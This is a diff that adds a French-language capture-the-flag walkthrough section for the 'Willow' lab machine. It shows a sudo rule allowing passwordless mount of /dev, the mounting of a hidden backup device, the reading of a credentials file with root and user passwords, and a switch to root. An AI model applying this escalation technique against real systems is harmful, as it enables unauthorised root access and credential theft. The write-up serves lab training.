@@ -342,6 +342,69 @@ THM{beneath_the_weeping_willow_tree}
 
 ## \[Task 4] Escalade de privilèges
 
+```
+willow@willow-tree:~$ sudo -l
+Matching Defaults entries for willow on willow-tree:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User willow may run the following commands on willow-tree:
+    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
+```
+
+Nos constatons que willow peut monter le répertoire /dev avec des privilèges sudo sans devoir entrer de mot de passe.
+
+Voyons ce qu'il y a dans /dev
+
+<figure><img src=".gitbook/assets/hidden_backup.png" alt=""><figcaption></figcaption></figure>
+
+Le répertoire hidden\_backup paraît très intéressant.  Montons-le avec sudo
+
+
+
+```
+willow@willow-tree:~$ mkdir hb
+willow@willow-tree:~$ sudo mount /dev/hidden_backup /home/willow/hb
+willow@willow-tree:~$ cd hb
+willow@willow-tree:~/hb$ ls -l
+total 1
+-rw-r--r-- 1 root root 42 Jan 30  2020 creds.txt
+willow@willow-tree:~/hb$ cat creds.txt
+root:7QvbvBTvwPspUK
+willow:U0ZZJLGYhNAT2s
+willow@willow-tree:~/hb$ su root
+Password: 
+root@willow-tree:/home/willow/hb# whoami
+root
+root@willow-tree:/home/willow/hb# ls -l /root/
+total 4
+-rw-r--r-- 1 root root 139 Jan 30  2020 root.txt
+root@willow-tree:/home/willow/hb# ls -la /root/
+total 36
+drwx------  5 root root 4096 Jan 30  2020 .
+drwxr-xr-x 23 root root 4096 Jan 30  2020 ..
+lrwxrwxrwx  1 root root    9 Jan 30  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  3 root root 4096 Jan 30  2020 .config
+drwxr-xr-x  3 root root 4096 Jan 30  2020 .local
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r--r--  1 root root  139 Jan 30  2020 root.txt
+-rw-r--r--  1 root root   74 Jan 30  2020 .selected_editor
+drwx------  2 root root 4096 Mar  1  2020 .ssh
+root@willow-tree:/home/willow/hb# cat /root/root.txt
+This would be too easy, don't you think? I actually gave you the root flag some time ago.
+You've got my password now -- go find your flag!
+
+```
+
+```
+root:7QvbvBTvwPspUK
+willow:U0ZZJLGYhNAT2s
+```
+
+Nous avons maintenant les crésentiels de **root:7QvbvBTvwPspUK** et de willow:U0ZZJLGYhNAT2s.
+
+Le contenu de root.txt nous dit que nous avons déjà reçu le root flag auparavant or a seule chose que nous ayons déjà reçue est le fichier user.jpg.
+
 ## \[Task 5] Réponses aux questions
 
 
